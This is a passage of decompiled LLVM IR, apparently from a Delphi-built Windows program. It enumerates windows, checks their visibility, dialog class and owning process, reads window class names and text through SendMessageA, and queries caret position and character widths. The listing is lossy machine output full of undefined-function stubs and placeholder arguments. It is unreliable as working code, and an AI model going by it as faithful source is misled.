  %7 = load i8, i8* %6, align 1, !insn.addr !1838
  %8 = icmp eq i8 %7, 92, !insn.addr !1838
  br i1 %8, label %dec_label_pc_407388, label %dec_label_pc_40737f, !insn.addr !1839

dec_label_pc_40737f:                              ; preds = %dec_label_pc_407378
  %9 = inttoptr i32 %4 to i8*, !insn.addr !1840
  store i8 92, i8* %9, align 1, !insn.addr !1840
  %10 = or i32 %3, 1, !insn.addr !1841
  %11 = add i32 %1, %10, !insn.addr !1841
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1841
  store i8 0, i8* %12, align 1, !insn.addr !1841
  br label %dec_label_pc_407388, !insn.addr !1841

dec_label_pc_407388:                              ; preds = %dec_label_pc_40737f, %dec_label_pc_407378
  %13 = call i32 @"@LStrFromArray"(), !insn.addr !1842
  store i32 %13, i32* %eax.0.reg2mem, !insn.addr !1842
  br label %dec_label_pc_407396, !insn.addr !1842

dec_label_pc_407396:                              ; preds = %dec_label_pc_407388, %dec_label_pc_407360
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1843
}

define i32 @function_4073a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_4073a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !1844
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %stack_var_-8, align 4, !insn.addr !1845
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1846
  store i32 %0, i32* %stack_var_-40, align 4, !insn.addr !1846
  %1 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1846
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1847
  store i32 %arg2, i32* %stack_var_-44, align 4, !insn.addr !1848
  %2 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1848
  %3 = inttoptr i32 %arg2 to i32*, !insn.addr !1849
  %4 = call i1 @IsWindowVisible(i32* %3), !insn.addr !1849
  %5 = icmp eq i1 %4, false, !insn.addr !1850
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1851
  br i1 %5, label %dec_label_pc_407457, label %dec_label_pc_4073d7, !insn.addr !1851

dec_label_pc_4073d7:                              ; preds = %dec_label_pc_4073a0
  store i32 %arg2, i32* %stack_var_-52, align 4, !insn.addr !1852
  %6 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1852
  %7 = call i32 @GetClassLongA(i32* inttoptr (i32 -32 to i32*), i32 %arg2), !insn.addr !1853
  %8 = icmp eq i32 %7, 32770, !insn.addr !1854
  %9 = icmp eq i1 %8, false, !insn.addr !1855
  store i32 %6, i32* %esp.0.reg2mem, !insn.addr !1855
  br i1 %9, label %dec_label_pc_407457, label %dec_label_pc_4073e6, !insn.addr !1855

dec_label_pc_4073e6:                              ; preds = %dec_label_pc_4073d7
  store i32 %arg2, i32* %stack_var_-56, align 4, !insn.addr !1856
  %10 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1856
  %11 = call i32* @GetParent(i32* %3), !insn.addr !1857
  %12 = ptrtoint i32* %11 to i32, !insn.addr !1857
  %13 = add i32 %arg1, 4, !insn.addr !1858
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1858
  %15 = load i32, i32* %14, align 4, !insn.addr !1858
  %16 = icmp eq i32 %15, %12, !insn.addr !1858
  %17 = icmp eq i1 %16, false, !insn.addr !1859
  store i32 %10, i32* %esp.0.reg2mem, !insn.addr !1859
  br i1 %17, label %dec_label_pc_407457, label %dec_label_pc_4073f1, !insn.addr !1859

dec_label_pc_4073f1:                              ; preds = %dec_label_pc_4073e6
  store i32 %arg2, i32* %stack_var_-64, align 4, !insn.addr !1860
  %18 = ptrtoint i32* %stack_var_-64 to i32, !insn.addr !1860
  %19 = call i32 @GetWindowThreadProcessId(i32* nonnull %stack_var_-8, i32* %3), !insn.addr !1861
  %20 = inttoptr i32 %arg1 to i32*, !insn.addr !1862
  %21 = load i32, i32* %20, align 4, !insn.addr !1862
  %22 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1863
  %23 = icmp eq i32 %21, %22, !insn.addr !1863
  %24 = icmp eq i1 %23, false, !insn.addr !1864
  store i32 %18, i32* %esp.0.reg2mem, !insn.addr !1864
  br i1 %24, label %dec_label_pc_407457, label %dec_label_pc_407402, !insn.addr !1864

dec_label_pc_407402:                              ; preds = %dec_label_pc_4073f1
  %25 = add i32 %arg1, 8, !insn.addr !1865
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1865
  %27 = load i32, i32* %26, align 4, !insn.addr !1865
  %28 = icmp eq i32 %27, 0, !insn.addr !1865
  br i1 %28, label %dec_label_pc_40742c, label %dec_label_pc_407408, !insn.addr !1866

dec_label_pc_407408:                              ; preds = %dec_label_pc_407402
  %29 = call i32 @function_407578(), !insn.addr !1867
  %30 = call i32 @"@LStrFromPChar"(), !insn.addr !1868
  %31 = call i32 @"@LStrCmp"(), !insn.addr !1869
  store i32 %18, i32* %esp.0.reg2mem
  br label %dec_label_pc_407457

dec_label_pc_40742c:                              ; preds = %dec_label_pc_407402
  %32 = add i32 %arg1, 12, !insn.addr !1870
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1870
  %34 = load i32, i32* %33, align 4, !insn.addr !1870
  %35 = add i32 %arg1, 16, !insn.addr !1871
  %36 = inttoptr i32 %35 to i32*, !insn.addr !1871
  %37 = load i32, i32* %36, align 4, !insn.addr !1871
  %38 = inttoptr i32 %34 to i32*, !insn.addr !1872
  %39 = inttoptr i32 %37 to i32*, !insn.addr !1872
  %40 = inttoptr i32 %arg2 to i8*, !insn.addr !1872
  %41 = call i32* @FindWindowExA(i32* %38, i32* %39, i8* null, i8* %40), !insn.addr !1872
  %42 = ptrtoint i32* %41 to i32, !insn.addr !1872
  %43 = add i32 %arg1, 24, !insn.addr !1873
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1873
  store i32 %42, i32* %44, align 4, !insn.addr !1873
  store i32 %42, i32* %stack_var_-84, align 4, !insn.addr !1874
  %45 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1874
  %46 = call i1 @IsWindow(i32* %41), !insn.addr !1875
  %47 = icmp eq i1 %46, false, !insn.addr !1876
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1877
  br i1 %47, label %dec_label_pc_407457, label %dec_label_pc_407452, !insn.addr !1877

dec_label_pc_407452:                              ; preds = %dec_label_pc_40742c
  %48 = add i32 %arg1, 20, !insn.addr !1878
  %49 = inttoptr i32 %48 to i32*, !insn.addr !1878
  store i32 %arg2, i32* %49, align 4, !insn.addr !1878
  store i32 %45, i32* %esp.0.reg2mem, !insn.addr !1879
  br label %dec_label_pc_407457, !insn.addr !1879

dec_label_pc_407457:                              ; preds = %dec_label_pc_407408, %dec_label_pc_407452, %dec_label_pc_40742c, %dec_label_pc_4073f1, %dec_label_pc_4073e6, %dec_label_pc_4073d7, %dec_label_pc_4073a0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1880
  %51 = load i32, i32* %50, align 4, !insn.addr !1880
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1881
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1882
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1882
  store i32 4224121, i32* %53, align 4, !insn.addr !1882
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1883
  ret i32 %54, !insn.addr !1884
}

define i32 @function_407472() local_unnamed_addr {
dec_label_pc_407472:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1885
  ret i32 %0, !insn.addr !1885
}

define i32 @function_407477() local_unnamed_addr {
dec_label_pc_407477:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1886
}

define i32 @function_407479(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407479:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1887
}

define i32 @function_407484(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407484:
  %esp.0.reg2mem = alloca i32, !insn.addr !1888
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1889
  %3 = inttoptr i32 %0 to i32*, !insn.addr !1890
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1890
  %5 = call i32 @GetWindowThreadProcessId(i32* %3, i32* %4), !insn.addr !1890
  %6 = call i32 @function_404448(), !insn.addr !1891
  %7 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1892
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1893
  br label %dec_label_pc_4074c8, !insn.addr !1893

dec_label_pc_4074c8:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_407484
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %8 = add i32 %esp.0.reload, -4, !insn.addr !1892
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1892
  store i32 %7, i32* %9, align 4, !insn.addr !1892
  %10 = add i32 %esp.0.reload, -8, !insn.addr !1894
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1894
  store i32 4223904, i32* %11, align 4, !insn.addr !1894
  %12 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1895
  %13 = add i32 %esp.0.reload, -12, !insn.addr !1896
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1896
  store i32 1, i32* %14, align 4, !insn.addr !1896
  call void @Sleep(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1897
  %15 = add i32 %esp.0.reload, -16, !insn.addr !1898
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1898
  store i32 0, i32* %16, align 4, !insn.addr !1898
  %17 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1899
  %18 = icmp eq i1 %17, false, !insn.addr !1900
  %19 = icmp eq i1 %18, false, !insn.addr !1901
  br i1 %19, label %dec_label_pc_4074f2, label %dec_label_pc_4074e7, !insn.addr !1901

dec_label_pc_4074e7:                              ; preds = %dec_label_pc_4074c8
  %20 = call i32 @function_404448(), !insn.addr !1902
  %21 = sub i32 %20, %6, !insn.addr !1903
  %22 = icmp ugt i32 %21, %arg2, !insn.addr !1904
  %23 = icmp eq i1 %22, false, !insn.addr !1905
  store i32 %15, i32* %esp.0.reg2mem, !insn.addr !1905
  br i1 %23, label %dec_label_pc_4074c8, label %dec_label_pc_4074f2, !insn.addr !1905

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074e7, %dec_label_pc_4074c8
  ret i32 0, !insn.addr !1906
}

define i32 @function_40750c() local_unnamed_addr {
dec_label_pc_40750c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !1907
  %.off = add i8 %1, -33
  %2 = icmp ult i8 %.off, 94
  %storemerge = sext i1 %2 to i32
  ret i32 %storemerge, !insn.addr !1908
}

define i32 @function_407524(i32 %arg1) local_unnamed_addr {
dec_label_pc_407524:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1909
  %edi.0.reg2mem = alloca i32, !insn.addr !1909
  %ecx.0.reg2mem = alloca i32, !insn.addr !1909
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1910
  br label %2, !insn.addr !1910

; <label>:2:                                      ; preds = %4, %dec_label_pc_407524
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1910
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1910
  br i1 %3, label %10, label %4, !insn.addr !1910

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1910
  %6 = load i8, i8* %5, align 1, !insn.addr !1910
  %7 = icmp eq i8 %6, 0, !insn.addr !1910
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1910
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1910
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1910
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1910
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1910
  br i1 %7, label %10, label %2, !insn.addr !1910

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1911
  ret i32 %11, !insn.addr !1912
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407578() local_unnamed_addr {
dec_label_pc_407578:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1913
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1914
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1914
  %4 = add i32 %3, %1, !insn.addr !1915
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1915
  store i8 0, i8* %5, align 1, !insn.addr !1915
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1916
  ret i32 %6, !insn.addr !1917
}

define i32 @function_4075ac() local_unnamed_addr {
dec_label_pc_4075ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1918
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1919
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1920
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1920
  %6 = add i32 %5, %3, !insn.addr !1921
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1921
  store i8 0, i8* %7, align 1, !insn.addr !1921
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1922
  ret i32 %8, !insn.addr !1923
}

define i32 @function_4075e4() local_unnamed_addr {
dec_label_pc_4075e4:
  %0 = call i32 @function_4034f4(), !insn.addr !1924
  %1 = call i32 @function_4034f4(), !insn.addr !1925
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1926
  ret i32 %2, !insn.addr !1927
}

define i32 @function_407624() local_unnamed_addr {
dec_label_pc_407624:
  %0 = call i32 @function_4034f4(), !insn.addr !1928
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1929
  ret i32 %1, !insn.addr !1930
}

define i32 @function_40765c() local_unnamed_addr {
dec_label_pc_40765c:
  %0 = call i32 @function_4036f4(), !insn.addr !1931
  %1 = call i32 @function_4036f4(), !insn.addr !1932
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1933
  %3 = icmp eq i32 %2, 2, !insn.addr !1934
  %4 = zext i1 %3 to i32, !insn.addr !1935
  %5 = and i32 %2, -256, !insn.addr !1935
  %6 = or i32 %5, %4, !insn.addr !1935
  ret i32 %6, !insn.addr !1936
}

define i32 @function_40768c() local_unnamed_addr {
dec_label_pc_40768c:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1937
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1937
  %esp.02.reg2mem = alloca i32, !insn.addr !1937
  %storemerge3.reg2mem = alloca i32, !insn.addr !1937
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1938
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1938
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1938
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1939
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1940
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1941
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1941
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1942
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1942
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1942
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1943
  %9 = icmp eq i1 %8, false, !insn.addr !1944
  %10 = icmp eq i1 %9, false, !insn.addr !1945
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1945
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1945
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1945
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1945
  br i1 %10, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !1945

dec_label_pc_4076b0:                              ; preds = %dec_label_pc_40768c, %dec_label_pc_4076b0
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407578(), !insn.addr !1946
  %12 = call i32 @function_40768c(), !insn.addr !1947
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1948
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1948
  store i32 2, i32* %14, align 4, !insn.addr !1948
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1949
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1949
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1949
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1950
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1942
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1942
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1943
  %21 = icmp eq i1 %20, false, !insn.addr !1944
  %22 = icmp eq i1 %21, false, !insn.addr !1945
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1945
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1945
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1945
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1945
  br i1 %22, label %dec_label_pc_4076b0, label %dec_label_pc_4076f0, !insn.addr !1945

dec_label_pc_4076f0:                              ; preds = %dec_label_pc_4076b0, %dec_label_pc_40768c
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1951
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1952
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1953
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1953
  store i32 4224781, i32* %25, align 4, !insn.addr !1953
  %26 = call i32 @"@LStrClr"(), !insn.addr !1954
  ret i32 %26, !insn.addr !1955
}

define i32 @function_407706() local_unnamed_addr {
dec_label_pc_407706:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1956
  ret i32 %0, !insn.addr !1956
}

define i32 @function_40770b() local_unnamed_addr {
dec_label_pc_40770b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1957
}

define i32 @function_40770d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40770d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1958
}

define i32 @function_407718() local_unnamed_addr {
dec_label_pc_407718:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1959
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1959
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1959
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1960
  %2 = call i32 @function_4075ac(), !insn.addr !1961
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1962
  %4 = call i32 @function_40768c(), !insn.addr !1963
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1964
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1965
  %6 = call i32 @"@LStrClr"(), !insn.addr !1966
  ret i32 %6, !insn.addr !1967
}

define i32 @function_407779() local_unnamed_addr {
dec_label_pc_407779:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1968
  ret i32 %0, !insn.addr !1968
}

define i32 @function_40777e() local_unnamed_addr {
dec_label_pc_40777e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1969
}

define i32 @function_407780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407780:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1970
}

define i32 @function_40779b() local_unnamed_addr {
dec_label_pc_40779b:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1971
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1971
  store i32 %3, i32* %4, align 4, !insn.addr !1971
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1972
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1972
  %9 = add i8 %6, %8, !insn.addr !1972
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1972
  store i8 %9, i8* %10, align 1, !insn.addr !1972
  %11 = add i32 %2, 81, !insn.addr !1973
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1973
  %13 = load i8, i8* %12, align 1, !insn.addr !1973
  %14 = trunc i32 %1 to i8, !insn.addr !1973
  %15 = add i8 %13, %14, !insn.addr !1973
  store i8 %15, i8* %12, align 1, !insn.addr !1973
  %16 = load i32, i32* %eax, align 4, !insn.addr !1974
  ret i32 %16, !insn.addr !1974
}

define x86_fp80 @function_4077a3() local_unnamed_addr {
dec_label_pc_4077a3:
  %0 = call x86_fp80 @__decompiler_undefined_function_12()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1975
  ret x86_fp80 %1, !insn.addr !1976
}

define i32 @function_4077a8() local_unnamed_addr {
dec_label_pc_4077a8:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1977
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1978
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1978
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1978
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1979
  %3 = call i32 @function_4075ac(), !insn.addr !1980
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1981
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1982
  %6 = icmp eq i32 %5, 180, !insn.addr !1983
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1984
  br i1 %6, label %dec_label_pc_40780b, label %dec_label_pc_4077e6, !insn.addr !1984

dec_label_pc_4077e6:                              ; preds = %dec_label_pc_4077a8
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1985
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1986
  %10 = icmp eq i1 %9, false, !insn.addr !1987
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1987
  br i1 %10, label %dec_label_pc_40780b, label %dec_label_pc_4077f2, !insn.addr !1987

dec_label_pc_4077f2:                              ; preds = %dec_label_pc_4077e6
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1988
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_40780b

dec_label_pc_40780b:                              ; preds = %dec_label_pc_4077f2, %dec_label_pc_4077a8, %dec_label_pc_4077e6
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1989
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1990
  %13 = add i32 %esp.1, 8, !insn.addr !1991
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1991
  store i32 4225070, i32* %14, align 4, !insn.addr !1991
  %15 = call i32 @"@LStrClr"(), !insn.addr !1992
  ret i32 %15, !insn.addr !1993
}

define i32 @function_407827() local_unnamed_addr {
dec_label_pc_407827:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1994
  ret i32 %0, !insn.addr !1994
}

define i32 @function_40782c() local_unnamed_addr {
dec_label_pc_40782c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1995
}

define i32 @function_40782e(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_40782e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1996
}

define i32 @function_407844() local_unnamed_addr {
dec_label_pc_407844:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1997
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1997
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1997
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1998
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1999
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1999
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !2000
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !2001
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !2002
  %11 = inttoptr i32 %1 to i32*, !insn.addr !2003
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !2003
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !2004
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !2005
  %16 = ashr i32 %15, 31, !insn.addr !2006
  %17 = zext i32 %15 to i64, !insn.addr !2007
  %18 = zext i32 %16 to i64, !insn.addr !2007
  %19 = mul i64 %18, 4294967296, !insn.addr !2007
  %20 = or i64 %19, %17, !insn.addr !2007
  %21 = zext i32 %4 to i64, !insn.addr !2007
  %22 = sdiv i64 %20, %21, !insn.addr !2007
  %23 = trunc i64 %22 to i32, !insn.addr !2007
  ret i32 %23, !insn.addr !2008
}

define i32 @function_4078a0() local_unnamed_addr {
dec_label_pc_4078a0:
  %esp.0.reg2mem = alloca i32, !insn.addr !2009
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2010
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !2010
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !2010
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2011
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !2012
  %3 = icmp eq i32 %2, 0, !insn.addr !2012
  br i1 %3, label %dec_label_pc_4078dc, label %dec_label_pc_4078c9, !insn.addr !2013

dec_label_pc_4078c9:                              ; preds = %dec_label_pc_4078a0
  %4 = inttoptr i32 %2 to i32*, !insn.addr !2014
  store i32 0, i32* %4, align 4, !insn.addr !2014
  br label %dec_label_pc_4078dc, !insn.addr !2015

dec_label_pc_4078dc:                              ; preds = %dec_label_pc_4078c9, %dec_label_pc_4078a0
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !2016
  %6 = icmp eq i32 %5, 0, !insn.addr !2016
  br i1 %6, label %dec_label_pc_4078f0, label %dec_label_pc_4078e6, !insn.addr !2017

dec_label_pc_4078e6:                              ; preds = %dec_label_pc_4078dc
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !2018
  %8 = icmp eq i32 %7, 0, !insn.addr !2018
  %9 = icmp eq i1 %8, false, !insn.addr !2019
  br i1 %9, label %dec_label_pc_4078fa, label %dec_label_pc_4078f0, !insn.addr !2019

dec_label_pc_4078f0:                              ; preds = %dec_label_pc_4078e6, %dec_label_pc_4078dc
  %10 = call i32 @function_4079d4(), !insn.addr !2020
